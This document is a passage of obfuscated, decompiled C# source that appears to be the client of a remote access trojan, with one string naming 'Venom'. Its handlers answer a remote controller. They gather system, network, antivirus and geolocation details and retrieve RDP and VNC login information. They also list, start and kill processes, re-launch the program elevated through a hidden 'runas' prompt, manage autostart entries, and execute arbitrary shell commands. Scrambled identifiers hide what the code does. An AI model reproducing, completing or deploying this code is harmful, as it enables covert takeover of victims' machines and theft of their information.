  public static void 쩂ᢊᤲ㮓ཱྀ\uE082\u32C2棺ᶉ룜扢稾떒\uD7AB쒒뚂䅀ᐦ紐쵘(
    DoStartupItemRemove command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 1:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 2:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 3:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 4:
          if (!청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 5:
          if (!청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鲠롼㚕뤱\uE177\uF7A1䮍啬㻢㱏煏즞壟줢\uF7C9琏室뫔룅髙(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 6:
          string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
          if (!System.IO.File.Exists(path))
            throw new IOException("File does not exist");
          System.IO.File.Delete(path);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Removing Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void ﳄ\u273D镯ᴯ诺犵툟\u0DD7\uF7AC\u2F67棸橖믶靸幒ߐ\u0E7D皘緐퇩(
    GetSystemInfo command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      string str1 = !string.IsNullOrEmpty(globalProperties.DomainName) ? globalProperties.DomainName : "-";
      string str2 = !string.IsNullOrEmpty(globalProperties.HostName) ? globalProperties.HostName : "-";
      new GetSystemInfoResponse(new string[36]
      {
        "Processor (CPU)",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.탛郢憐剎\uF085㿌쭉缫ᗡ发ꀇ爙\uFFFD狣႐쫹콾挽킹լ(),
        "Memory (RAM)",
        string.Format("{0} MB", (object) 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.ꖕ鳌컌히ⱻ䝵銉\uEBF2\u3304ꆝ媰补嵻融\uE2DD礘罨櫓㲒ꘞ()),
        "Video Card (GPU)",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.煸\u2E5E학뙧킳\u24A5\uF8C0蜢櫡뜗냴䪡鋙\uF25A瞈勓㨔柯팲䌞(),
        "Username",
        햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.\u2A83莤\uEEF7鑔羽䝛톹䓭ⴃ㕢‮\uEA57懰\uE527\uEA49晲\u08D2셙糭뚽(),
        "PC Name",
        飑છ蟋\uFE5Cᰎ\u0D51\u2B72\u254D陠ᜫ\uFFFD瑛놺ḕ묄钯䕽\uE400凧ව.\uE58E\u2CF7ꅪ偱쐭ꃤ\uA638洢僘ꖯ쌴겂ሧ\u3319\uF1DD칳貱뱕\uEFF1ꩰ(),
        "Domain Name",
        str1,
        "Host Name",
        str2,
        "System Drive",
        Path.GetPathRoot(Environment.SystemDirectory),
        "System Directory",
        Environment.SystemDirectory,
        "Uptime",
        飑છ蟋\uFE5Cᰎ\u0D51\u2B72\u254D陠ᜫ\uFFFD瑛놺ḕ묄钯䕽\uE400凧ව.ᒠ읢躩椅\u2F3F彺\u4DEF痥\uFFFDᚾ툧堤\u0AD8㲑烄੪则逯ꝱ\uE0DD(),
        "MAC Address",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.堕揮옶驪\u2A6E캒ꔤ䊴䢲‍峜\u24CD衩녿뷬瑰\u0BF8\uFFFD禂丯(),
        "LAN IP Address",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.湮醓䄩Ꭰᡴ浮뻅̲㢚\u32B2ꆄ廧\uFAFF睃嚰㪰ꇷ땏ऩ셕(),
        "WAN IP Address",
        \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Ip,
        "Antivirus",
        飑છ蟋\uFE5Cᰎ\u0D51\u2B72\u254D陠ᜫ\uFFFD瑛놺ḕ묄钯䕽\uE400凧ව.\u0E35ࠪꑘ\uF80A䶗齼蟐\uF8AD톲죓媈뛿ᰗ\uFFFD\u33DDቭ\u258A䯝晻樛(),
        "Firewall",
        飑છ蟋\uFE5Cᰎ\u0D51\u2B72\u254D陠ᜫ\uFFFD瑛놺ḕ묄钯䕽\uE400凧ව.焰\uFFFD嫻傲儱\uF333ጟ혚㼴\u2789榨藦邞䍜㦅ᷲ䎧䵣폎埅(),
        "Time Zone",
        \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Timezone,
        "Country",
        \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Country,
        "ISP",
        \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Isp
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void 킴䕇\uF7B8逕袣壟癝刌\uFFFD䆝\uE05D\u28F3䁸䠧艙Ɋ崐藵갮\uFFFD(
    GetVncInfo command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.堺㮈\uFFFD캹峌\uF3F7꽋\u28BC\uF84F\u20FB\u2192䬑뫯纬\uFFFD櫆嵿\u24CC댯\u27EE()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void 脵\u1B7E䮲䲁\u2E94Ԫ엃笇㻜ᣠ䙰畐㦟彘\uE848\u0F3C翠톂기죯(
    GetRdpInfo command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.㬇苊᠎ན䉈玈ꧥ잠鹕깬怜霡贳ᕼꁻ\uF782鸣ꂲƢΩ()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void 莠涱\u2A92텡枬叾\u219A\uE06BⲖ\uFFFD䎀짠㐗핖\uFFFD叾兙ދ茞쐪(
    GetProcesses command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    Process[] processes1 = Process.GetProcesses();
    string[] processes2 = new string[processes1.Length];
    int[] ids = new int[processes1.Length];
    string[] titles = new string[processes1.Length];
    int index = 0;
    foreach (Process process in processes1)
    {
      processes2[index] = process.ProcessName + ".exe";
      ids[index] = process.Id;
      titles[index] = process.MainWindowTitle;
      ++index;
    }
    new GetProcessesResponse(processes2, ids, titles).Execute(client);
  }

  public static void 萔ላ\u1AAF鰝㛒䒅㸁\uE77C폢催㵭\uEEFE㣬햕鯐뻄둝㟕ቢ䫳(
    DoProcessStart command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (string.IsNullOrEmpty(command.Processname))
    {
      new SetStatus("Process could not be started!").Execute(client);
    }
    else
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          FileName = command.Processname
        });
      }
      catch
      {
        new SetStatus("Process could not be started!").Execute(client);
      }
      finally
      {
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.莠涱\u2A92텡枬叾\u219A\uE06BⲖ\uFFFD䎀짠㐗핖\uFFFD叾兙ދ茞쐪(new GetProcesses(), client);
      }
    }
  }

  public static void 兔寷鲈\uF795\uF719䡾\u33D5택\u0B0D\uEAC3绞얌딄뛃\uF2FE뙐\uECA4㼛缦\uEC87(
    DoProcessKill command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      Process.GetProcessById(command.PID).Kill();
    }
    catch
    {
    }
    finally
    {
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.莠涱\u2A92텡枬叾\u219A\uE06BⲖ\uFFFD䎀짠㐗핖\uFFFD叾兙ދ茞쐪(new GetProcesses(), client);
    }
  }

  public static void \u31BC䵜陵萑䐪㻶貱\u27A3\u31D5ዜ\uF8F0悑焗\uE861ᱞ橀맿\uFF62Ẋ슌(
    DoAskElevate command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.\u23E7䳓㒀㠉쬙\uA95B壳\uE222ꍹ폊Ą僦ꇊ빂詮鸦\u08E0顔䫺卓() != "Admin")
    {
      ProcessStartInfo startInfo = new ProcessStartInfo()
      {
        FileName = "cmd",
        Verb = "runas",
        Arguments = "/k START \"\" \"" + ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath + "\" & EXIT",
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true
      };
      瞎삆缊骎\u3284䫭\uAA3D词\uFFFD뱭胳䲿偸ꅟ賎圣鶱\uFFFD\uF470\uE9DA.掟\uA4CB톿庀㟯鄷뎩ﰈ瑸榆㰩鍁\uEC88\u33DEѶ\u28F5湪䴩恐딏();
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
        new SetStatus("User refused the elevation request.").Execute(client);
        瞎삆缊骎\u3284䫭\uAA3D词\uFFFD뱭胳䲿偸ꅟ賎圣鶱\uFFFD\uF470\uE9DA.銃\uEF36㖿\uFFFD㳏擻됌\uE6EF勡᤺\u2870\u2BE4\u2E6FⰠ\uFFFD\uFE41딩괂㧩뗣(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.鶨硂ॎ\uE25DΆŒ\u29DD线\uF6FC㫙ᚸ줲瘳匊捀ቋ\uF605㤫\uFFFDᎈ);
        return;
      }
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋.旋\uF321\u28D9尡\u087F㔆\uEA3B풤뀒짣䧉㮲脞謕䁳\uEC03숨ᩥᔷ\uE492();
    }
    else
      new SetStatus("Process already elevated.").Execute(client);
  }

  public static void \uEDCFꪋ\uF2B2䚆\uFFFD芩ᓉ\u2376ก\u271F\uEF1A撼\uF8BF\u0876\uFFFDퟱＴ칈\uFFFD鲋(
    DoRemoveRdp command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ㄉ\u23D0㓄抋\uFF01戹\uF8E3잱ૐ㛵㚘携\uE885糇㹣怹懧\u0E7B훙鐦();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.㷅\u25E9謜㵁陣ɉ뗪\uFFFD㜗\u0EDA頷䞫킔ሡ㼍똴襵\uE3F7\u4DE7窲();
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uE498㦱ꐛ\uF52A䕆朰乗ꌅ䞊줁贳\uE92E昢㸔쬺㝡\uF3F7쾨릷匿();
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.媐좄芾朡Ⳅ\uFFFD뗣绝埳啃긬騶\uFFFD\uF5A7有퇋踍ᇩꄈꙛ("Venom");
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
  }

  public static void ᢤ橮ન넯\uF064䍸\uAACBᄩ뻸\uE943\u3366ꜵ娬딿ᴰ렆\u4DEA횯\uED98뭻(
    DoRemoveVnc command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ㄉ\u23D0㓄抋\uFF01戹\uF8E3잱ૐ㛵㚘携\uE885糇㹣怹懧\u0E7B훙鐦();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.矘굼众幑갼ﭦ歂핪臾畮\uF4ECᾸ뎋ᆤ鼈ᡆ崚놿ᠫ缑();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
  }

  public static void \u2E60苎ꥥ㣁ධ\uF1FD晫\u2FF8\uF5F9뛾嵬ꄻ顿횯矞탛豬蜏\uE1B7郝(
    DoShellExecute command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    string command1 = command.Command;
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱 == null && command1 == "exit")
      return;
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱 == null)
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱 = new Shell();
    if (command1 == "exit")
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.틹ஃ\uF210\uF54D핧赝桕\u4DFFﻛ產㬙믡䃏횥倦\uECB0䌐ᾰ깃临();
    else
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱.ExecuteCommand(command1);
  }

  public static void 틹ஃ\uF210\uF54D핧赝桕\u4DFFﻛ產㬙믡䃏횥倦\uECB0䌐ᾰ깃临()
  {
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱 == null)
      return;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱.Dispose();
  }

  public struct 敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ
  {
    public uint 跒弆\uE719종侀\u25FC噰\u2010\uF30C䠚荣럘ᅺ덪䄧ᰩ贶\u2D75ፎ艚;
    public uint \uE864녬鐚碡䠨\u18AF쏛绾\uFFFD먋갘嬷ᒸ倭ꭻ\uF406\uFFFD麒Ⴐ繑;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] ꄌ䡸钛\uE6B3蔰竨馉샽\u061D㡟潠\u20AE\u26C5褞ᨙ\uFFFD쾍腿ֻ侶;
    public uint 撦Џ煅䍋酰ꠣᛊ᷑\uE902嗍\u2EA8圍\u0BA0艻\uEF0E\uE7A0嬝㟩琨軳;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] 韏胂\uE1F2빗\u31C3\u331C뾈ꉭ机햿ㅵ\u08DB烄\uE671ꋖ폩\uE37D답绐匙;
    public uint \u2444貥젞忮郹怲ʀ\u3321\uEDD4뢜好䔓悙떯㒔ᵓ\u2BCB扑麽況;

    public IPAddress LocalAddress => new IPAddress((long) this.\uE864녬鐚碡䠨\u18AF쏛绾\uFFFD먋갘嬷ᒸ倭ꭻ\uF406\uFFFD麒Ⴐ繑);

    public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
    {
      this.ꄌ䡸钛\uE6B3蔰竨馉샽\u061D㡟潠\u20AE\u26C5褞ᨙ\uFFFD쾍腿ֻ侶[1],
      this.ꄌ䡸钛\uE6B3蔰竨馉샽\u061D㡟潠\u20AE\u26C5褞ᨙ\uFFFD쾍腿ֻ侶[0]
    }, 0);

    public IPAddress RemoteAddress => new IPAddress((long) this.撦Џ煅䍋酰ꠣᛊ᷑\uE902嗍\u2EA8圍\u0BA0艻\uEF0E\uE7A0嬝㟩琨軳);

    public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
    {
      this.韏胂\uE1F2빗\u31C3\u331C뾈ꉭ机햿ㅵ\u08DB烄\uE671ꋖ폩\uE37D답绐匙[1],
      this.韏胂\uE1F2빗\u31C3\u331C뾈ꉭ机햿ㅵ\u08DB烄\uE671ꋖ폩\uE37D답绐匙[0]
    }, 0);
  }

  public struct 蓀\u0FF2됳瞤䊣聁줘\u2CF7韠̔姄\u248C鏍\uE252\u272BƉ澡犣紅褻
  {
    public uint 䇗聸\u22A0䪊\u4DF4늭숄栙쌔誜㐄谎υ으자ﮉ\uEB0E\u1BF8\uFFFD尅;
    private readonly 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ \u26D6㾣큧墮\uE741੦ᗈ梬ឲ䡲霦璭誐釓홟\u2A4B粝ꕙ쇁\u295A;
  }

  private enum ޓ핏゙\uED53\uF8B1젹\uF1CF簠լ懶풙퀂䇜ᆨ唳㲉衆䃃\u22BF鲖
  {
    \uE985\uF430\uE81F뙁\u2E23ᅰ\uF1FD\uFFFDᚎ仼ꛨ傂禶ޟ\u25C3뷾擣벘窰鹪,
    푮㙁咯\uF0E2\uFFFD玾\uEC5F벨ꧠ遠ꅦ\u24D6\uF566\uEF34覵슰\u291E僰㶽냃,
    쪟䂤覽翄襔ྜྷ䙗ⴁ\uA83D쏔\uF234ꠄ䭇뗳輛霝ṵ鰫\uF2EEΘ,
    컌ɽ属\uA7F1渷驒謵彷\u225F켷\uE7B0瑻ʱ春ㅎ鳀\uE8A6뙥豥和,
    \uFFFDⰌ齩s裈抄悍\u0E61鐂Ἐ툳ꎾ쥒뇤ꉎ\uF500槠㩭럼뉯,
    洉ﮏ姎㧏鑭ㅶ댥헖蔋ᘼঙB蹨鋡絁ッ館燓\u2406㤝,
    絶猩ڐᩊಉ텗\uE18Fㇴ娰\uEAF8\uF7C9諃䕦苕꿚팧檈\uF342亰墲,
    됖㻫춅\u3283䙚Ꙑ䧻뜠꼧䐙\u335D\u02F5폍㚗墍拧淋ꗎ\uED70굛,
    㱊\uE6B1퀃\uEFEE店뎨ߒ쾐\u33ED퓪紏畨罡漗ꄞ䱾㛪ꞥ\u203Dꏽ,
  }
}
